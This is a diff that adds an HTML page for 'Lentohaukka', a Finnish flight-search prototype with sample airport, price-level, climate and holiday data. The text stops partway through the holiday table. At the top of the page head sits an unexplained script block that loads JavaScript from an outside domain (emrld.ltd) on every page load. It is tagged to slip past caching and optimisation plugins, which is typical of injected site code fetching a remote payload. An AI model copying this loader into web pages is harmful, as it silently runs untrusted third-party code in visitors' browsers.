@@ -1,0 +1,545 @@
+<!doctype html>
+<html lang="fi">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<script nowprocket data-noptimize="1" data-cfasync="false" data-wpfc-render="false" seraph-accel-crit="1" data-no-defer="1" data-cmp-ab="2">
+  (function () {
+      var script = document.createElement("script");
+      script.async = 1;
+      script.setAttribute("data-cmp-ab","2");
+      script.src = 'https://emrld.ltd/NTk2Njk3.js?t=596697';
+      document.head.appendChild(script);
+  })();
+</script>
+<title>Lentohaukka</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Big+Shoulders+Display:wght@600;800&family=IBM+Plex+Sans:wght@400;500;600&family=IBM+Plex+Mono:wght@500;600&display=swap">
+<style>
+/* Layout: lähtötaulun henki – yksi hakupaneeli, tulokset tarkastuskortteina, seurannat alla */
+:root{
+  --bg:#EDF0F3; --surface:#FFFFFF; --ink:#13202B; --muted:#5B6874; --line:#D3DAE1;
+  --accent:#D9930B; --accent-ink:#1B1406; --deal:#1E7F5C; --deal-bg:#E1F2EA; --up:#B4442F;
+  --board:#13202B; --board-ink:#F3D27A;
+  --f-display:"Big Shoulders Display","Arial Narrow",Impact,sans-serif;
+  --f-body:"IBM Plex Sans",system-ui,-apple-system,"Segoe UI",sans-serif;
+  --f-mono:"IBM Plex Mono",ui-monospace,Menlo,Consolas,monospace;
+}
+@media (prefers-color-scheme: dark){:root:not([data-theme="light"]){
+  --bg:#0E151C; --surface:#16212B; --ink:#E6ECF1; --muted:#93A1AE; --line:#2A3946;
+  --accent:#F0B43A; --accent-ink:#1B1406; --deal:#5CC99D; --deal-bg:#163329; --up:#E8826C;
+  --board:#070C11; --board-ink:#F3D27A; color-scheme:dark}}
+:root[data-theme="dark"]{
+  --bg:#0E151C; --surface:#16212B; --ink:#E6ECF1; --muted:#93A1AE; --line:#2A3946;
+  --accent:#F0B43A; --accent-ink:#1B1406; --deal:#5CC99D; --deal-bg:#163329; --up:#E8826C;
+  --board:#070C11; --board-ink:#F3D27A; color-scheme:dark}
+body{background:var(--bg);color:var(--ink);font-family:var(--f-body);font-size:15px;line-height:1.5}
+.wrap{max-width:760px;margin:0 auto;padding-block:20px 48px;padding-left:max(16px,env(safe-area-inset-left,0px));padding-right:max(16px,env(safe-area-inset-right,0px));display:grid;gap:20px}
+header{display:grid;gap:6px}
+h1{font-family:var(--f-display);font-weight:800;font-size:2.6rem;line-height:1;letter-spacing:.01em;margin:0;text-transform:uppercase}
+.lede{color:var(--muted);margin:0;max-width:60ch}
+.demo{font-size:.8rem;font-weight:600;letter-spacing:.06em;text-transform:uppercase;color:var(--accent-ink);background:var(--accent);padding:3px 8px;border-radius:3px;justify-self:start}
+.panel{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:16px;display:grid;gap:16px}
+.row{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:14px}
+label,.lbl{font-size:.75rem;font-weight:600;letter-spacing:.07em;text-transform:uppercase;color:var(--muted);display:block;margin-bottom:6px}
+select,input[type=number]{width:100%;font:inherit;color:var(--ink);background:var(--bg);border:1px solid var(--line);border-radius:6px;padding:8px 10px;box-sizing:border-box}
+input[type=range]{width:100%;accent-color:var(--accent)}
+.val{font-family:var(--f-mono);font-weight:600;font-size:1.05rem;font-variant-numeric:tabular-nums}
+.seg{display:flex;border:1px solid var(--line);border-radius:6px;overflow:hidden}
+.seg button{flex:1;font:inherit;font-size:.85rem;background:transparent;color:var(--muted);border:0;padding:8px 6px;cursor:pointer}
+.seg button[aria-pressed="true"]{background:var(--ink);color:var(--surface);font-weight:600}
+.hint{font-size:.82rem;color:var(--muted);margin:4px 0 0}
+.actions{display:flex;flex-wrap:wrap;gap:10px;align-items:center;justify-content:space-between}
+.btn{font:inherit;font-weight:600;border-radius:6px;padding:9px 14px;cursor:pointer;border:1px solid var(--ink);background:var(--ink);color:var(--surface)}
+.btn.ghost{background:transparent;color:var(--ink)}
+.btn:focus-visible,.seg button:focus-visible,select:focus-visible,input:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+.board{background:var(--board);color:var(--board-ink);border-radius:10px;padding:12px 14px;font-family:var(--f-mono);font-size:.85rem;display:flex;flex-wrap:wrap;gap:6px 16px;justify-content:space-between}
+.board b{color:#fff;font-weight:600}
+.list{display:grid;gap:8px}
+.ticket{background:var(--surface);border:1px solid var(--line);border-radius:8px;display:grid;grid-template-columns:auto 1fr auto;gap:4px 14px;align-items:center;padding:12px 14px;position:relative}
+.route{font-family:var(--f-mono);font-weight:600;font-size:1.05rem;letter-spacing:.02em;white-space:nowrap}
+.route span{color:var(--muted);font-weight:500}
+.city{min-width:0}
+.city strong{display:block;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.city small{color:var(--muted);font-size:.82rem}
+.price{text-align:right;font-family:var(--f-display);font-weight:800;font-size:1.7rem;line-height:1;font-variant-numeric:tabular-nums}
+.price small{display:block;font-family:var(--f-body);font-weight:500;font-size:.72rem;color:var(--muted);margin-top:3px}
+.tag{display:inline-block;font-size:.7rem;font-weight:600;letter-spacing:.05em;text-transform:uppercase;padding:1px 6px;border-radius:3px;background:var(--deal-bg);color:var(--deal);margin-left:6px;vertical-align:2px}
+.empty{color:var(--muted);text-align:center;padding:24px;border:1px dashed var(--line);border-radius:8px}
+h2{font-family:var(--f-display);font-weight:800;font-size:1.5rem;text-transform:uppercase;margin:8px 0 0;letter-spacing:.02em}
+.watch{background:var(--surface);border:1px solid var(--line);border-radius:8px;padding:12px 14px;display:grid;grid-template-columns:1fr auto;gap:8px 14px;align-items:center}
+.watch .q{font-weight:600}
+.watch .meta{font-size:.82rem;color:var(--muted)}
+.watch svg{width:120px;height:36px;display:block}
+.chg{font-family:var(--f-mono);font-size:.82rem;font-weight:600}
+.chg.down{color:var(--deal)} .chg.up{color:var(--up)}
+.alert{font-size:.8rem;font-weight:600;color:var(--deal)}
+.x{background:none;border:0;color:var(--muted);cursor:pointer;font:inherit;font-size:.8rem;text-decoration:underline;padding:0}
+.filters{display:grid;gap:14px;border-top:1px solid var(--line);padding-top:14px}
+.chips{display:flex;flex-wrap:wrap;gap:6px}
+.chip{font:inherit;font-size:.84rem;border:1px solid var(--line);background:var(--bg);color:var(--muted);border-radius:999px;padding:6px 12px;cursor:pointer;line-height:1.2}
+.chip small{display:block;font-size:.7rem;opacity:.8}
+.chip[aria-pressed="true"]{border-color:var(--ink);background:var(--ink);color:var(--surface)}
+.chip:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+.facts{display:flex;flex-wrap:wrap;gap:4px 10px;font-size:.8rem;color:var(--muted);margin-top:2px;font-variant-numeric:tabular-nums}
+.pl{font-family:var(--f-mono);font-weight:600;letter-spacing:.04em}
+.pl i{font-style:normal;opacity:.25}
+.hols,.fihols{display:flex;flex-wrap:wrap;gap:4px;margin-top:6px}
+.fihols{margin-top:-8px}
+.fihols .lbl{width:100%;margin:0}
+.hol{font-size:.74rem;font-weight:500;padding:2px 7px;border-radius:3px;background:var(--bg);border:1px solid var(--line);color:var(--ink)}
+.hol.fi{border-color:var(--accent)}
+.hol.warn{border-color:var(--up);color:var(--up);font-weight:600}
+input[type=text]{width:100%;font:inherit;color:var(--ink);background:var(--bg);border:1px solid var(--line);border-radius:6px;padding:8px 10px;box-sizing:border-box}
+.chk{display:flex;gap:8px;align-items:flex-start;text-transform:none;letter-spacing:0;font-size:.9rem;font-weight:400;color:var(--ink);margin:6px 0}
+.alertp{border-color:var(--accent);border-width:2px}
+.livebar{position:fixed;left:0;right:0;bottom:0;z-index:5;background:var(--board);color:var(--board-ink);display:flex;gap:12px;align-items:center;justify-content:space-between;padding-block:10px calc(10px + env(safe-area-inset-bottom,0px));padding-left:max(16px,env(safe-area-inset-left,0px));padding-right:max(16px,env(safe-area-inset-right,0px));font-family:var(--f-mono);font-size:.88rem;transition:transform .2s}
+.livebar.off{transform:translateY(110%)}
+.livebar .btn{background:var(--accent);color:var(--accent-ink);border-color:var(--accent);padding:7px 12px;font-family:var(--f-body)}
+.livebar b{color:#fff}
+@media (prefers-reduced-motion:reduce){.livebar{transition:none}}
+.wrap{padding-bottom:96px}
+.toast{bottom:calc(72px + env(safe-area-inset-bottom,0px))!important}
+.demo.live{background:var(--deal-bg);color:var(--deal)}
+.book{grid-column:1/-1;justify-self:start;font-weight:600;font-size:.85rem;color:var(--ink);text-decoration:none;border-bottom:2px solid var(--accent);padding-bottom:1px;margin-top:4px}
+.book:hover{border-color:var(--ink)}
+.toast{position:fixed;left:50%;bottom:calc(16px + env(safe-area-inset-bottom,0px));transform:translateX(-50%);background:var(--ink);color:var(--surface);padding:10px 16px;border-radius:6px;font-weight:600;font-size:.9rem}
+@media (max-width:480px){
+  .ticket{grid-template-columns:1fr auto}
+  .ticket .route{grid-column:1/-1}
+  .watch{grid-template-columns:1fr}
+}
+</style>
+
+<style>body{margin:0}[hidden]{display:none!important}img{max-width:100%}*,*::before,*::after{box-sizing:border-box}</style>
+</head>
+<body>
+<div class="wrap">
+  <header>
+    <span class="demo">Prototyyppi · esimerkkidata</span>
+    <h1>Lentohaukka</h1>
+    <p class="lede">Etsi lentoja hinnan ja etäisyyden mukaan: minne vain alle tietyn summan, tietyn kilometrimatkan sisällä. Tallenna haku, niin sen hintoja seurataan.</p>
+  </header>
+
+  <section class="panel" aria-label="Haku">
+    <div class="row">
+      <div>
+        <label for="origin">Kotikenttä</label>
+        <select id="origin"></select>
+      </div>
+      <div>
+        <label for="month">Matka-aika</label>
+        <select id="month"></select>
+      </div>
+    </div>
+
+    <div class="row">
+      <div>
+        <label for="maxDirect">Suora lento enintään</label>
+        <div class="val" id="maxDirectV"></div>
+        <input type="range" id="maxDirect" min="0" max="16" step="0.5" value="0">
+      </div>
+      <div>
+        <label for="maxStop">Yhdellä välilaskulla yhteensä enintään</label>
+        <div class="val" id="maxStopV"></div>
+        <input type="range" id="maxStop" min="0" max="30" step="0.5" value="0">
+      </div>
+      <p class="hint" style="grid-column:1/-1;margin:0">Vapaaehtoinen. Kun arvo on 0 h, säädin ei rajaa hakua. Jos asetat molemmat, kohde kelpaa kun jompikumpi ehto täyttyy.</p>
+    </div>
+
+    <div class="row">
+      <div>
+        <label for="maxPrice">Hinta enintään</label>
+        <div class="val" id="maxPriceV"></div>
+        <input type="range" id="maxPrice" min="30" max="800" step="10" value="150">
+      </div>
+      <div>
+        <label for="maxKm">Kohde enintään</label>
+        <div class="val" id="maxKmV"></div>
+        <input type="range" id="maxKm" min="200" max="10000" step="100" value="3000">
+      </div>
+      <div>
+        <label for="minKm">Kohde vähintään</label>
+        <div class="val" id="minKmV"></div>
+        <input type="range" id="minKm" min="0" max="5000" step="100" value="0">
+      </div>
+    </div>
+
+    <div>
+      <span class="lbl" id="depL">Lähtökentät</span>
+      <div class="seg" role="group" aria-labelledby="depL">
+        <button type="button" id="depOne" aria-pressed="true">Vain kotikenttä</button>
+        <button type="button" id="depNear" aria-pressed="false">Myös lähikentät</button>
+      </div>
+      <div id="radiusBox" hidden>
+        <label for="radius" style="margin-top:12px">Lähikenttien säde</label>
+        <div class="val" id="radiusV"></div>
+        <input type="range" id="radius" min="100" max="600" step="25" value="250">
+        <p class="hint" id="nearList"></p>
+      </div>
+    </div>
+
+    <div class="filters">
+      <div><span class="lbl">Hintataso kohdemaassa</span><div class="chips" data-k="pl"></div><p class="hint">Maailmanlaajuinen asteikko, maailman keskiarvo = 100. Esim. 1: Egypti, Intia, Vietnam · 2: Turkki, Thaimaa, Indonesia · 3: Puola, Kreikka, Espanja · 4: Saksa, Italia, Iso-Britannia · 5: Suomi, Sveitsi, Yhdysvallat.</p></div>
+      <div><span class="lbl">Sademäärä</span><div class="chips" data-k="rain"></div></div>
+      <div><span class="lbl">Päivälämpötila</span><div class="chips" data-k="day"></div></div>
+      <div><span class="lbl">Yölämpötila</span><div class="chips" data-k="night"></div></div>
+      <p class="hint">Ilmasto lasketaan matkakuukaudelle. Joustavalla ajalla haetaan halvin kuukausi, jonka sää täyttää ehdot.</p>
+    </div>
+
+    <div class="actions">
+      <span class="hint" id="summary"></span>
+      <button class="btn" id="saveBtn" type="button">Seuraa tätä hakua</button>
+    </div>
+  </section>
+
+  <div class="board" aria-live="polite" id="board"></div>
+  <div class="fihols" id="fiHols" hidden></div>
+  <div class="list" id="results"></div>
+
+  <section class="panel alertp" id="alertPanel" hidden aria-labelledby="alertT">
+    <h2 id="alertT" style="margin:0">Seurannan asetukset</h2>
+    <p class="hint" id="alertQ" style="margin:0"></p>
+    <div class="row">
+      <div><label for="aName">Nimi</label><input type="text" id="aName" maxlength="60"></div>
+      <div><label for="aPrice">Hälytä kun hinta alle (€)</label><input type="number" id="aPrice" min="10" step="5"></div>
+      <div><label for="aDrop">Tai kun hinta laskee vähintään (%)</label><input type="number" id="aDrop" min="0" max="90" step="5" placeholder="0 = ei käytössä"></div>
+    </div>
+    <div class="row">
+      <div><span class="lbl">Ilmoitus</span><div class="chips" id="aChan"></div></div>
+      <div><span class="lbl">Tarkistusväli</span><div class="chips" id="aFreq"></div></div>
+    </div>
+    <div class="row">
+      <div><span class="lbl">Muut</span>
+        <label class="chk"><input type="checkbox" id="aQuiet"> Ei ilmoituksia klo 22–08</label>
+        <label class="chk"><input type="checkbox" id="aNew"> Ilmoita vain uusista kohteista tai uusista alimmista hinnoista</label>
+      </div>
+    </div>
+    <p class="hint" style="margin:0">Prototyypissä asetukset tallentuvat, mutta ilmoituksia ei vielä lähetetä. Ne alkavat toimia, kun appiin kytketään oikea hintadata ja palvelin.</p>
+    <div class="actions"><button class="btn ghost" id="aCancel" type="button">Peruuta</button><button class="btn" id="aSave" type="button">Tallenna seuranta</button></div>
+  </section>
+
+  <h2>Seuratut haut</h2>
+  <div class="list" id="watches"></div>
+</div>
+<div class="livebar" id="liveBar"><span id="liveTxt"></span><button class="btn" id="liveGo" type="button">Näytä tulokset ↓</button></div>
+
+<script>
+(function(){
+const ORIGINS={HEL:["Helsinki",60.317,24.963],TMP:["Tampere",61.414,23.604],TKU:["Turku",60.514,22.262],TLL:["Tallinna",59.413,24.833],OUL:["Oulu",64.930,25.355],ARN:["Tukholma",59.652,17.919]};
+const ORIGIN_FACTOR={HEL:1,TLL:0.88,ARN:0.92,TMP:1.15,TKU:1.12,OUL:1.2};
+const DEST={ARN:["Tukholma","Ruotsi",59.652,17.919],CPH:["Kööpenhamina","Tanska",55.618,12.656],OSL:["Oslo","Norja",60.194,11.100],RIX:["Riika","Latvia",56.924,23.971],VNO:["Vilna","Liettua",54.634,25.286],GDN:["Gdańsk","Puola",54.378,18.466],WAW:["Varsova","Puola",52.166,20.967],KRK:["Krakova","Puola",50.078,19.785],BER:["Berliini","Saksa",52.366,13.503],PRG:["Praha","Tšekki",50.101,14.260],VIE:["Wien","Itävalta",48.110,16.570],BUD:["Budapest","Unkari",47.437,19.256],AMS:["Amsterdam","Alankomaat",52.310,4.768],LGW:["Lontoo","Iso-Britannia",51.153,-0.182],DUB:["Dublin","Irlanti",53.421,-6.270],EDI:["Edinburgh","Iso-Britannia",55.950,-3.373],CDG:["Pariisi","Ranska",49.010,2.548],BRU:["Bryssel","Belgia",50.901,4.484],MUC:["München","Saksa",48.354,11.786],ZRH:["Zürich","Sveitsi",47.458,8.548],MXP:["Milano","Italia",45.630,8.723],FCO:["Rooma","Italia",41.800,12.239],NAP:["Napoli","Italia",40.886,14.291],VCE:["Venetsia","Italia",45.505,12.352],BCN:["Barcelona","Espanja",41.297,2.078],MAD:["Madrid","Espanja",40.472,-3.561],AGP:["Málaga","Espanja",36.675,-4.499],ALC:["Alicante","Espanja",38.282,-0.558],PMI:["Palma","Espanja",39.552,2.739],LIS:["Lissabon","Portugali",38.774,-9.134],FAO:["Faro","Portugali",37.014,-7.966],ATH:["Ateena","Kreikka",37.936,23.947],HER:["Heraklion","Kreikka",35.340,25.180],RHO:["Rodos","Kreikka",36.405,28.086],SPU:["Split","Kroatia",43.539,16.298],DBV:["Dubrovnik","Kroatia",42.561,18.268],IST:["Istanbul","Turkki",41.275,28.752],AYT:["Antalya","Turkki",36.898,30.800],LCA:["Larnaka","Kypros",34.875,33.625],TFS:["Teneriffa","Espanja",28.044,-16.572],LPA:["Gran Canaria","Espanja",27.932,-15.387],RAK:["Marrakech","Marokko",31.607,-8.036],KEF:["Reykjavík","Islanti",63.985,-22.605],RVN:["Rovaniemi","Suomi",66.565,25.830],KTT:["Kittilä","Suomi",67.701,24.847],DXB:["Dubai","Arabiemiirikunnat",25.253,55.365],TLV:["Tel Aviv","Israel",32.011,34.887],JFK:["New York","Yhdysvallat",40.640,-73.779],BKK:["Bangkok","Thaimaa",13.690,100.750],HKT:["Phuket","Thaimaa",8.113,98.317],NRT:["Tokio","Japani",35.772,140.393],SIN:["Singapore","Singapore",1.364,103.991],HRG:["Hurghada","Egypti",27.178,33.799],HAN:["Hanoi","Vietnam",21.221,105.807],GOI:["Goa","Intia",15.381,73.831],DPS:["Bali","Indonesia",-8.748,115.167],SKP:["Skopje","Pohjois-Makedonia",41.962,21.621],TIA:["Tirana","Albania",41.415,19.721],PRN:["Pristina","Kosovo",42.573,21.036]};
+/* Hintataso maailmanlaajuisella asteikolla (maailman keskiarvo = 100).
+   Eurostat 2025 (EU27=100) muunnettu kertoimella 1,212 (Suomi 121 -> 146,7); muut Maailmanpankin ICP 2021. */
+const PLI={"Ruotsi":147,"Tanska":170,"Norja":156,"Latvia":101,"Liettua":101,"Puola":88,"Saksa":131,"Tšekki":108,"Itävalta":137,"Unkari":95,"Alankomaat":141,"Iso-Britannia":140.5,"Irlanti":165,"Ranska":133,"Belgia":141,"Sveitsi":207,"Italia":118,"Espanja":112,"Portugali":105,"Kreikka":105,"Kroatia":95,"Turkki":73,"Kypros":108,"Marokko":69.6,"Islanti":211,"Suomi":147,"Arabiemiirikunnat":101.9,"Israel":179.1,"Yhdysvallat":158.5,"Thaimaa":55.2,"Japani":142.5,"Singapore":95.6,"Egypti":39,"Vietnam":48.7,"Intia":44.4,"Indonesia":53.3,"Pohjois-Makedonia":67,"Albania":88,"Kosovo":67}; /* Kosovo: ei virallista lukua, arvioitu Pohjois-Makedonian tasolle */
+const plLevel=v=>v<50?1:v<75?2:v<115?3:v<145?4:5;
+/* Ilmasto joulu–toukokuu: [keskim. päivän ylin °C, yön alin °C, sademäärä mm/kk], pitkän aikavälin keskiarvot */
+const CLIM={ARN:[[2,-3,50],[0,-5,40],[1,-5,30],[5,-3,30],[11,1,30],[17,6,40]],CPH:[[5,1,55],[3,-1,50],[4,-1,35],[7,0,40],[12,3,35],[17,7,45]],OSL:[[0,-6,55],[-2,-8,50],[-1,-8,35],[4,-4,40],[10,1,45],[16,6,60]],RIX:[[1,-3,50],[-1,-6,40],[0,-6,35],[5,-3,30],[12,2,35],[18,7,40]],VNO:[[0,-4,50],[-2,-7,45],[-1,-7,40],[4,-3,40],[13,2,40],[19,7,55]],GDN:[[3,-2,40],[1,-4,35],[2,-4,30],[6,-1,35],[12,3,30],[17,7,50]],WAW:[[2,-3,40],[0,-5,30],[2,-4,30],[7,-1,35],[14,4,35],[20,9,55]],KRK:[[3,-3,40],[1,-5,35],[3,-4,30],[9,0,40],[15,4,50],[20,9,80]],BER:[[4,0,45],[3,-2,40],[5,-2,35],[9,1,40],[15,4,35],[20,9,55]],PRG:[[3,-2,30],[1,-4,25],[4,-3,25],[9,0,30],[14,3,35],[19,8,65]],VIE:[[4,-1,45],[3,-2,40],[5,-1,40],[10,2,50],[16,6,45],[21,11,70]],BUD:[[4,-1,45],[2,-3,35],[6,-2,35],[11,2,30],[17,6,45],[22,11,65]],AMS:[[7,2,80],[6,1,65],[7,1,55],[10,2,55],[14,5,40],[18,8,55]],LGW:[[9,3,60],[8,2,60],[9,2,45],[12,3,40],[15,5,45],[18,8,50]],DUB:[[9,3,75],[8,2,65],[9,2,50],[11,3,50],[13,4,50],[16,7,55]],EDI:[[7,1,65],[7,1,65],[7,1,45],[9,2,50],[12,4,40],[15,6,50]],CDG:[[8,3,55],[7,3,50],[9,3,45],[13,5,45],[16,8,50],[20,11,65]],BRU:[[7,2,80],[6,1,70],[7,1,60],[11,3,60],[15,5,50],[19,9,65]],MUC:[[4,-3,50],[3,-4,50],[5,-4,45],[10,0,60],[15,3,70],[19,8,110]],ZRH:[[4,-1,75],[3,-2,65],[5,-2,60],[10,1,70],[15,5,80],[19,9,115]],MXP:[[7,-1,70],[6,-2,60],[9,-1,50],[14,3,70],[18,6,95],[23,11,125]],FCO:[[14,5,100],[13,4,70],[14,4,70],[16,6,60],[19,8,65],[24,12,45]],NAP:[[14,6,130],[13,5,100],[14,5,90],[16,7,80],[19,9,70],[24,13,45]],VCE:[[8,1,65],[7,0,50],[9,1,50],[13,4,60],[17,8,75],[22,13,75]],BCN:[[15,7,50],[14,6,40],[15,6,35],[17,8,40],[19,10,45],[22,14,45]],MAD:[[11,2,55],[10,2,35],[12,2,35],[16,5,30],[18,7,45],[23,11,45]],AGP:[[18,9,90],[17,8,65],[17,8,60],[19,10,40],[21,11,35],[24,14,15]],ALC:[[18,7,30],[17,6,20],[18,6,25],[20,8,25],[22,10,30],[25,14,30]],PMI:[[16,7,50],[15,6,40],[15,6,40],[17,8,35],[19,10,40],[23,13,30]],LIS:[[15,9,110],[15,8,100],[16,9,70],[19,10,60],[20,12,60],[23,14,40]],FAO:[[17,9,90],[16,8,60],[17,9,50],[19,10,40],[21,12,40],[24,14,15]],ATH:[[15,8,70],[14,7,55],[14,7,45],[17,8,45],[21,11,25],[26,16,15]],HER:[[17,11,90],[16,9,90],[16,9,70],[18,10,55],[21,12,25],[25,15,10]],RHO:[[18,11,170],[16,9,140],[16,9,100],[18,10,70],[21,12,25],[25,16,10]],SPU:[[12,5,120],[11,4,80],[12,5,70],[15,7,75],[18,10,65],[23,15,60]],DBV:[[14,7,180],[13,6,110],[13,6,110],[15,8,110],[18,11,90],[22,15,60]],IST:[[11,5,120],[9,3,100],[10,3,75],[12,4,70],[17,8,45],[22,13,35]],AYT:[[17,7,250],[15,6,220],[16,6,140],[19,8,90],[22,11,45],[27,15,25]],LCA:[[19,9,80],[17,7,70],[17,7,55],[20,9,40],[23,12,15],[27,16,5]],TFS:[[23,16,25],[22,15,15],[22,15,15],[23,16,15],[23,16,5],[24,17,2]],LPA:[[23,16,20],[21,15,20],[22,15,15],[22,16,10],[23,16,5],[24,18,2]],RAK:[[19,6,35],[19,6,30],[20,8,35],[23,11,35],[25,12,30],[29,16,15]],KEF:[[3,-2,90],[3,-2,85],[3,-2,80],[4,-1,85],[7,1,60],[10,4,45]],RVN:[[-6,-13,45],[-8,-16,40],[-7,-15,30],[-2,-11,30],[4,-5,30],[11,2,40]],KTT:[[-9,-18,35],[-10,-20,30],[-9,-19,25],[-3,-14,25],[2,-8,25],[9,0,35]],DXB:[[26,16,15],[24,14,20],[25,15,25],[29,18,20],[33,21,10],[38,25,1]],TLV:[[21,11,130],[18,9,130],[19,9,90],[21,11,60],[24,14,15],[27,17,3]],JFK:[[6,-1,100],[4,-3,90],[5,-2,80],[10,2,105],[17,7,100],[22,12,95]],BKK:[[32,22,10],[33,22,15],[34,24,25],[35,26,50],[36,27,80],[35,27,220]],HKT:[[32,24,60],[32,24,30],[33,24,20],[33,25,50],[33,25,130],[32,25,290]],NRT:[[12,4,60],[10,2,60],[11,2,60],[14,5,115],[19,10,130],[23,15,140]],SIN:[[30,24,250],[31,24,230],[32,24,150],[32,25,180],[32,25,170],[32,25,170]],HRG:[[24,14,1],[22,12,0],[23,12,0],[26,15,0],[30,19,0],[33,23,0]],HAN:[[22,15,20],[20,14,20],[21,16,30],[23,18,50],[28,22,100],[32,25,190]],GOI:[[33,21,10],[32,20,1],[32,21,0],[33,23,1],[33,26,10],[33,27,100]],DPS:[[31,24,350],[30,24,350],[30,24,300],[31,24,200],[31,24,90],[31,24,80]],SKP:[[5,-3,50],[4,-4,35],[8,-2,35],[13,2,40],[19,6,45],[24,10,60]],TIA:[[13,3,150],[12,2,130],[13,3,130],[16,5,110],[20,8,100],[25,13,90]],PRN:[[4,-4,60],[3,-5,45],[6,-4,40],[11,0,45],[17,4,55],[22,9,70]]};
+
+/* Kohdemaiden suurimmat pyhät ja lomat 12/2026–5/2027. "~" = kuun näkymiseen perustuva ennakkoarvio. */
+const XM=["2026-12-24","2026-12-26","Joulu"],NY=["2026-12-31","2027-01-01","Uusivuosi"],EA=["2027-03-26","2027-03-29","Pääsiäinen"],MAY1=["2027-05-01","2027-05-01","Vappu"],ASC=["2027-05-06","2027-05-06","Helatorstai"],WHIT=["2027-05-16","2027-05-17","Helluntai"],EPI=["2027-01-06","2027-01-06","Loppiainen"];
+const ORT=["2027-04-30","2027-05-03","Ortodoksinen pääsiäinen"],FITR=["2027-03-09","2027-03-11","Ramadanin päätösjuhla ~"],ADHA=["2027-05-16","2027-05-19","Uhrijuhla ~"];
+const HOL={
+"Ruotsi":[XM,NY,EPI,EA,["2027-04-30","2027-05-01","Valborg ja vappu"],ASC],
+"Tanska":[XM,NY,["2027-03-25","2027-03-29","Pääsiäinen"],ASC,WHIT],
+"Norja":[XM,NY,["2027-03-25","2027-03-29","Pääsiäinen"],MAY1,ASC,["2027-05-17","2027-05-17","Kansallispäivä ja helluntai"]],
+"Latvia":[XM,NY,EA,MAY1,["2027-05-04","2027-05-04","Itsenäisyyden palautus"]],
+"Liettua":[XM,NY,["2027-02-16","2027-02-16","Itsenäisyyspäivä"],["2027-03-11","2027-03-11","Itsenäisyyden palautus"],EA,MAY1],
+"Puola":[XM,NY,EPI,EA,["2027-05-01","2027-05-03","Toukokuun pitkä viikonloppu"],WHIT,["2027-05-27","2027-05-27","Corpus Christi"]],
+"Saksa":[XM,NY,EA,MAY1,ASC,WHIT,["2027-05-27","2027-05-27","Corpus Christi (osa osavaltioista)"]],
+"Tšekki":[XM,NY,EA,MAY1,["2027-05-08","2027-05-08","Vapautuspäivä"]],
+"Itävalta":[XM,NY,EPI,EA,MAY1,ASC,WHIT,["2027-05-27","2027-05-27","Corpus Christi"]],
+"Unkari":[XM,NY,["2027-03-15","2027-03-15","Kansallispäivä"],EA,MAY1,WHIT],
+"Alankomaat":[XM,NY,EA,["2027-04-27","2027-04-27","Kuninkaanpäivä"],["2027-05-05","2027-05-05","Vapautuspäivä"],ASC,WHIT],
+"Iso-Britannia":[["2026-12-25","2026-12-28","Joulu"],NY,EA,["2027-05-03","2027-05-03","Bank holiday"],["2027-05-31","2027-05-31","Bank holiday"]],
+"Irlanti":[["2026-12-25","2026-12-26","Joulu"],NY,["2027-02-01","2027-02-01","St Brigid's Day"],["2027-03-17","2027-03-17","Pyhän Patrickin päivä"],EA,["2027-05-03","2027-05-03","Bank holiday"]],
+"Ranska":[XM,NY,EA,MAY1,["2027-05-08","2027-05-08","Voitonpäivä"],ASC,WHIT],
+"Belgia":[XM,NY,EA,MAY1,ASC,WHIT],
+"Sveitsi":[XM,NY,EA,ASC,WHIT],
+"Italia":[XM,NY,EPI,EA,["2027-04-25","2027-04-25","Vapautuspäivä"],MAY1],
+"Espanja":[XM,NY,EPI,["2027-03-21","2027-03-29","Semana Santa"],MAY1],
+"Portugali":[XM,NY,EA,["2027-04-25","2027-04-25","Neilikkavallankumous"],MAY1,["2027-05-27","2027-05-27","Corpus Christi"]],
+"Kreikka":[XM,NY,EPI,["2027-03-15","2027-03-15","Puhdas maanantai"],["2027-03-25","2027-03-25","Itsenäisyyspäivä"],ORT],
+"Kypros":[XM,NY,EPI,["2027-03-15","2027-03-15","Puhdas maanantai"],["2027-03-25","2027-03-25","Kansallispäivä"],["2027-04-01","2027-04-01","Kansallispäivä"],ORT],
+"Kroatia":[XM,NY,EPI,EA,MAY1,["2027-05-27","2027-05-27","Corpus Christi"]],
+"Turkki":[NY,["2027-03-09","2027-03-11","Ramazan Bayramı ~"],["2027-04-23","2027-04-23","Lasten päivä"],MAY1,["2027-05-16","2027-05-19","Kurban Bayramı ~"],["2027-05-19","2027-05-19","Nuorison päivä"]],
+"Marokko":[NY,["2027-01-11","2027-01-11","Itsenäisyysmanifestin päivä"],["2027-01-14","2027-01-14","Amazigh-uusivuosi"],["2027-03-09","2027-03-10","Eid al-Fitr ~"],MAY1,["2027-05-16","2027-05-17","Eid al-Adha ~"]],
+"Islanti":[XM,NY,["2027-03-25","2027-03-29","Pääsiäinen"],["2027-04-22","2027-04-22","Kesän ensimmäinen päivä"],MAY1,ASC,WHIT],
+"Suomi":[XM,NY,EPI,EA,["2027-04-30","2027-05-01","Vappu"],ASC],
+"Arabiemiirikunnat":[["2026-12-02","2026-12-03","Kansallispäivä"],NY,["2027-02-08","2027-03-08","Ramadan ~"],FITR,["2027-05-15","2027-05-18","Arafat ja Eid al-Adha ~"]],
+"Israel":[["2027-04-21","2027-04-28","Pesach"]],
+"Yhdysvallat":[["2026-12-25","2026-12-25","Joulu"],NY,["2027-01-18","2027-01-18","Martin Luther King Day"],["2027-02-15","2027-02-15","Presidents' Day"],["2027-05-31","2027-05-31","Memorial Day"]],
+"Thaimaa":[NY,["2027-02-21","2027-02-22","Makha Bucha"],["2027-04-06","2027-04-06","Chakri-päivä"],["2027-04-13","2027-04-15","Songkran"],["2027-05-01","2027-05-04","Vappu ja kruunajaispäivä"],["2027-05-20","2027-05-20","Visakha Bucha"]],
